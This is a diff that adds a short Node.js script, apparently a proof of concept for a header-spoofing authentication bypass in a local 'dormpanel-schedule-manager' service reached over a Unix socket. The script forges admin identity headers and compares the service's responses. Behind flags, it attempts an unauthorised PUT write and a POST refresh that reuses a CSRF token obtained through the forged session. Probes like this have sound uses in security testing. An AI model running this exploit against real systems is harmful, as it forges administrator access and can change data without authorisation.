@@ -1,0 +1,16 @@
+import http from 'node:http';
+const socketPath='/var/apps/dormpanel-schedule-manager/target/app.sock';
+const prefix='/app/dormpanel-schedule-manager';
+async function call(headers, method='GET', path='/api/schedule?date=2026-10-12') {
+  return new Promise(resolve => {
+    const req=http.request({socketPath,path:prefix+path,method,headers},res=>{
+      let b='';res.on('data',c=>b+=c);res.on('end',()=>{let v;try{v=JSON.parse(b)}catch{} resolve({http:res.statusCode,state:v?.status,courses:v?.courses?.length,hasCsrf:!!v?.csrf,error:v?.error,token:v?.csrf});});
+    });req.on('error',e=>resolve({transportError:e.code}));req.end();
+  });
+}
+const spoof={'X-Trim-Userid':'424242','X-Trim-Isadmin':'true'};
+const forged=await call(spoof);
+const result={uid:process.getuid(),gid:process.getgid(),groups:process.getgroups(),missing:await call({}),nonadmin:await call({...spoof,'X-Trim-Isadmin':'false'}),forged};
+if(process.argv.includes('--probe-write')) result.write=await call(spoof,'PUT','/api/schedule');
+if(process.argv.includes('--refresh') && forged.token) result.refresh=await call({...spoof,'X-DormPanel-CSRF':forged.token},'POST','/api/refresh');
+console.log(JSON.stringify(result,(key,v)=>key==='token'?undefined:v));
